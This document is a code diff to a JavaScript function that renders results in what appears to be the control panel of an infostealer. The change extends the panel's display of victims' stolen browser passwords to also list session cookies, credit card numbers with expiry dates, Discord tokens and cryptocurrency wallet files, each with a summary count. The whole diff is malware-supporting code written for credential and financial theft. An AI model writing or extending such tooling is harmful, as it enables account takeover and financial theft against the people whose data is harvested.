@@ -498,41 +498,98 @@ function handleStealResult(msg) {
   if (!stealResult) return;
   stealResult.classList.remove("hidden");
 
-  const creds = msg.credentials || [];
-  const tokens = msg.tokens || [];
-  const errors = msg.errors || [];
+  const creds   = msg.credentials || [];
+  const cookies = msg.cookies     || [];
+  const cards   = msg.cards       || [];
+  const tokens  = msg.tokens      || [];
+  const wallets = msg.wallets     || [];
+  const errors  = msg.errors      || [];
 
   if (stealSummary) {
-    stealSummary.textContent =
-      `${creds.length} credential${creds.length !== 1 ? "s" : ""}, ` +
-      `${tokens.length} token${tokens.length !== 1 ? "s" : ""}` +
+    const parts = [];
+    if (creds.length)   parts.push(`${creds.length} password${creds.length !== 1 ? "s" : ""}`);
+    if (cookies.length) parts.push(`${cookies.length} cookie${cookies.length !== 1 ? "s" : ""}`);
+    if (cards.length)   parts.push(`${cards.length} card${cards.length !== 1 ? "s" : ""}`);
+    if (tokens.length)  parts.push(`${tokens.length} token${tokens.length !== 1 ? "s" : ""}`);
+    if (wallets.length) parts.push(`${wallets.length} wallet file${wallets.length !== 1 ? "s" : ""}`);
+    stealSummary.textContent = (parts.join(", ") || "Nothing found") +
       (errors.length ? ` — ${errors.length} error${errors.length !== 1 ? "s" : ""}` : "");
   }
 
   if (!stealCreds) return;
   const lines = [];
-  for (const c of creds) {
-    lines.push(
-      `<div class="py-0.5 border-b border-slate-700/40">` +
-      `<span class="text-violet-400">${escapeHtml(c.browser)}</span>` +
-      (c.profile && c.profile !== "Default" ? ` <span class="text-slate-500">[${escapeHtml(c.profile)}]</span>` : "") +
-      ` <span class="text-slate-300">${escapeHtml(c.url)}</span>` +
-      ` <span class="text-cyan-300">${escapeHtml(c.username)}</span>` +
-      ` <span class="text-green-300">${escapeHtml(c.password)}</span>` +
-      `</div>`
-    );
+
+  if (creds.length) {
+    lines.push(`<div class="text-xs font-semibold text-violet-400 mt-1 mb-0.5">Passwords</div>`);
+    for (const c of creds) {
+      lines.push(
+        `<div class="py-0.5 border-b border-slate-700/40">` +
+        `<span class="text-violet-400">${escapeHtml(c.browser)}</span>` +
+        (c.profile && c.profile !== "Default" ? ` <span class="text-slate-500">[${escapeHtml(c.profile)}]</span>` : "") +
+        ` <span class="text-slate-300">${escapeHtml(c.url)}</span>` +
+        ` <span class="text-cyan-300">${escapeHtml(c.username)}</span>` +
+        ` <span class="text-green-300">${escapeHtml(c.password)}</span>` +
+        `</div>`
+      );
+    }
   }
-  for (const t of tokens) {
-    lines.push(
-      `<div class="py-0.5 border-b border-slate-700/40">` +
-      `<span class="text-yellow-400">Discord token</span> ` +
-      `<span class="text-slate-300 break-all">${escapeHtml(t)}</span>` +
-      `</div>`
-    );
+
+  if (cookies.length) {
+    lines.push(`<div class="text-xs font-semibold text-blue-400 mt-2 mb-0.5">Cookies (${cookies.length})</div>`);
+    for (const c of cookies) {
+      lines.push(
+        `<div class="py-0.5 border-b border-slate-700/40">` +
+        `<span class="text-blue-400">${escapeHtml(c.browser)}</span>` +
+        ` <span class="text-slate-400">${escapeHtml(c.host)}</span>` +
+        ` <span class="text-cyan-300">${escapeHtml(c.name)}</span>=` +
+        `<span class="text-slate-300 break-all">${escapeHtml(c.value)}</span>` +
+        `</div>`
+      );
+    }
   }
+
+  if (cards.length) {
+    lines.push(`<div class="text-xs font-semibold text-yellow-400 mt-2 mb-0.5">Credit Cards</div>`);
+    for (const c of cards) {
+      lines.push(
+        `<div class="py-0.5 border-b border-slate-700/40">` +
+        `<span class="text-yellow-400">${escapeHtml(c.browser)}</span>` +
+        ` <span class="text-slate-300">${escapeHtml(c.name)}</span>` +
+        ` <span class="text-green-300">${escapeHtml(c.number)}</span>` +
+        ` <span class="text-slate-500">${c.expiryMonth}/${c.expiryYear}</span>` +
+        `</div>`
+      );
+    }
+  }
+
+  if (tokens.length) {
+    lines.push(`<div class="text-xs font-semibold text-indigo-400 mt-2 mb-0.5">Discord Tokens</div>`);
+    for (const t of tokens) {
+      lines.push(
+        `<div class="py-0.5 border-b border-slate-700/40">` +
+        `<span class="text-indigo-300 break-all">${escapeHtml(t)}</span>` +
+        `</div>`
+      );
+    }
+  }
+
+  if (wallets.length) {
+    lines.push(`<div class="text-xs font-semibold text-orange-400 mt-2 mb-0.5">Wallet Files</div>`);
+    for (const w of wallets) {
+      lines.push(
+        `<div class="py-0.5 border-b border-slate-700/40">` +
+        `<span class="text-orange-400">${escapeHtml(w.wallet)}</span>` +
+        ` <span class="text-slate-300">${escapeHtml(w.filename)}</span>` +
+        ` <span class="text-slate-500 text-xs">${w.dataB64?.length ?? 0} b64 chars</span>` +
+        `</div>`
+      );
+    }
+  }
+
   for (const e of errors) {
     lines.push(`<div class="text-red-400">✗ ${escapeHtml(e)}</div>`);
   }
+
   stealCreds.innerHTML = lines.length ? lines.join("") : `<span class="text-slate-500">Nothing found.</span>`;
 }
 
